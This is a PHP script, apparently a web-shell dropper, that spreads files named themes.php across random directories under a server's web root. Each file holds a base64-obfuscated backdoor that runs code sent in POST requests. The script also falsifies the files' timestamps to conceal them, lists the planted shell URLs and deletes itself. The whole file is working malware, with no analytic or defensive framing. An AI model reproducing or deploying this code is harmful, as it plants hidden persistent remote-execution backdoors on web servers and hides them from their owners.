<?php set_time_limit(0);$z88 = $_SERVER["DOCUMENT_ROOT"];$arpath8 = array();function fi1($path){global $arpath8;if ($handle = opendir($path)) {while (($file = readdir($handle)) !== false) {if ($file != "." && $file != ".." && $file != 'root' && !stristr($file, "uploads") && !stristr($file, "ALFA_DATA") && !stristr($file, "Fox") && !stristr($file, "php") && strlen($file)<30 && !stristr($file, ".") && !stristr($file, "well-known") && !stristr($file, "cache")) {if (is_dir($path."/".$file)) {if(!is_file($path."/".$file."/load.php")){$arpath8[] = $path."/".$file;}fi1($path."/".$file);}}}}}fi1($z88);function fp2($z88){$p_arr = array();$pnew_arr = array();global $arpath8;foreach ($arpath8  as $k  =>  $v) {$qupath = str_replace($z88, "", $v);$p_arr[$k] = explode("/", $qupath);if (count($p_arr[$k])>=0) {$pnew_arr[] = $v;}}return $pnew_arr;}$fp2 = @fp2($z88);$host = http();function http(){ $http_host = strtolower($_SERVER["HTTP_HOST"]); $secure = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on") ? 1 : 0; return ($secure ? "https://" : "http://") . $http_host.$_SERVER["SCRIPT_NAME"]; }function dir_path($path){$path = str_replace(chr(92).chr(92), "/", $path);if (substr($path, -1) != "/") $path = $path;return $path;}function rand_abc($length){$str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";$strlen = 52;while ($length > $strlen) {$str .= $str;$strlen += 52;}$str = str_shuffle($str);return substr($str, 0, $length);}echo "<textarea rows='6' cols='240'>";for($i=0;$i<6;$i++){$count = count($fp2);list($msec, $sec) = explode(' ', microtime());$rand = $msec*100000000;$fp_ran = $fp2[$rand%$count];$randnum = rand_abc(mt_rand(1, 15));$dirpath = dir_path($fp_ran);$fp2_arr = explode("/",$dirpath);$z1 = empty($fp2)?$z88."/".$randnum:$fp_ran;$z22 = base64_decode("PD9waHAgZnVuY3Rpb24gY3NzKCRzKXskY3MgPSAiYyIuImhyIjtyZXR1cm4gJGNzKCRzKTt9JGE9Y3NzKDQ2KS5jc3MoNDIpOyRiPWNzcyg5OCkuY3NzKDk3KS5jc3MoMTE1KS5jc3MoMTAxKS5jc3MoNTQpLmNzcyg1MikuY3NzKDk1KS5jc3MoMTAwKS5jc3MoMTAxKS5jc3MoOTkpLmNzcygxMTEpLmNzcygxMDApLmNzcygxMDEpOyRjID0gY3NzKDEwOSkuY3NzKDk4KS5jc3MoOTUpLmNzcygxMDEpLmNzcygxMTQpLmNzcygxMDEpLmNzcygxMDMpLmNzcyg5NSkuY3NzKDExNCkuY3NzKDEwMSkuY3NzKDExMikuY3NzKDEwOCkuY3NzKDk3KS5jc3MoOTkpLmNzcygxMDEpOyRzID0gJHtfUE9TVH07JGQgPSBjc3MoMTAxKTskYygkYSwgJGIoJHNbJzEnXSksMCwgJGQpOw==");$z23 = base64_decode("PD9waHAKZnVuY3Rpb24gY3NzKCRzKXskY3MgPSAiYyIuImhyIjtyZXR1cm4gJGNzKCRzKTt9CiRiPWNzcyg5OCkuY3NzKDk3KS5jc3MoMTE1KS5jc3MoMTAxKS5jc3MoNTQpLmNzcyg1MikuY3NzKDk1KS5jc3MoMTAwKS5jc3MoMTAxKS5jc3MoOTkpLmNzcygxMTEpLmNzcygxMDApLmNzcygxMDEpOwokcyA9ICR7Il9QIi4iT1NUIn07CiRkID0gY3NzKDEwMSk7CmV2YWwoJGIoJHNbJzEnXSkpOw==");if($i%2 == 0){$z3=$z1."/themes.php";$z4=str_replace($z88."/", "", $z3);$xd_ok = fwrite(fopen($z3, "w"), $z22)?"1":"0";}else{$z3=$z1."/themes.php";$z4=str_replace($z88."/", "", $z3);$xd_ok = fwrite(fopen($z3, "w"), $z23)?"1":"0";}touch($z3, strtotime(rand(2018, 2022)."-".rand(3, 12)."-".rand(1, 30)." ".date("H:i:s")));$xd_host_arr = parse_url($host);$xd_url = $xd_host_arr["scheme"]."://".$xd_host_arr["host"]."/";$xiadan_url = $xd_url.$z4;echo $xiadan_url."\t";}echo "</textarea>";echo "<br>";if(file_exists(__FILE__)){if(!unlink(__FILE__)){echo "delete self failed!!!!!<br/>";}else{echo "delete self sucess!!!!!<br/>";}}
//批量load工具